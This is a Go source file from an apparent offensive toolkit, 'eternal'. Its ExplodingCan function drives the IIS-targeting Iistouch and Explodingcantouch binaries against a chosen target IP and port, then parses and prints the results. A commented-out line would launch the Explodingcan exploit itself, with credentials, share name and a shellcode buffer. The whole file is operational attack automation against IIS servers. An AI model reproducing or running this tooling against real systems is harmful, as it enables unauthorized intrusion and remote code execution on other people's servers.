package exploits

import (
	"eternal/conf"
	"eternal/metadatas"
	"eternal/utils"
	"fmt"
	"os/exec"
	"path/filepath"
)

func ExplodingCan() {
	filename := filepath.Join(metadatas.MetaData.LogDir, metadatas.MetaData.ProjectName, utils.CreateXmlFileName("Iistouch"))
	metadatas.MetaData.SetIisPort()
	metadatas.MetaData.SetEnableSSL()
	metadatas.MetaData.SetHostString()
	cmd := exec.Command(conf.Touches+"Iistouch-1.2.2.exe", "--InConfig", conf.Touches+"Iistouch-1.2.2.0.xml", "--OutConfig", filename, "--TargetIp", metadatas.MetaData.TargetIp, "--TargetPort", metadatas.MetaData.IIS.Port, "--NetworkTimeout", metadatas.MetaData.NetworkTimeout, "--EnableSSL", metadatas.MetaData.IIS.EnableSSL, "--HostString", metadatas.MetaData.IIS.HostString)
	utils.Execute(cmd)
	IisTouchResults := utils.ParseIisXml(filename)
	fmt.Println(IisTouchResults)
	filename = filepath.Join(metadatas.MetaData.LogDir, metadatas.MetaData.ProjectName, utils.CreateXmlFileName("Iistouch"))
	cmd = exec.Command(conf.Touches+"Explodingcantouch-1.2.1.exe", "--InConfig", conf.Touches+"Explodingcantouch-1.2.1.0.xml", "--OutConfig", filename, "--TargetIp", metadatas.MetaData.TargetIp, "--TargetPort", metadatas.MetaData.IIS.Port, "--NetworkTimeout", metadatas.MetaData.NetworkTimeout, "--EnableSSL", metadatas.MetaData.IIS.EnableSSL, "--HostString", metadatas.MetaData.IIS.HostString, "--Delay", metadatas.MetaData.IIS.Delay, "--maxSizeToCheck", metadatas.MetaData.IIS.MaxSizeToCheck)
	utils.Execute(cmd)
	ExplodingcanTouchResults := utils.ParseIisXml(filename)
	fmt.Println(ExplodingcanTouchResults)
	//cmd = exec.Command(filepath.Join(conf.Exploits, "Explodingcan-2.0.2.exe"), "--InConfig", filepath.Join(conf.Exploits, "Explodingcan-2.0.2.0.xml"), "--OutConfig", filepath.Join(metadatas.MetaData.LogDir, "logs.txt"), "--TargetIp", metadatas.MetaData.TargetIp, "--TargetPort", metadatas.MetaData.TargetPort, "--Target", results["Target"], "--NetworkTimeout", metadatas.MetaData.NetworkTimeout, "--Protocol", results["Protocol"], "--PipeName", results["PipeName"], "--TargetOsArchitecture", results["TargetOsArchitecture"], "--Credentials", results["Credentials"], "--ShareName", results["ShareName"], "--ShellcodeBuffer", metadatas.MetaData.ShellcodeBuffer)
	//utils.Execute(cmd)
	metadatas.MetaData.ShowMetaData()
}
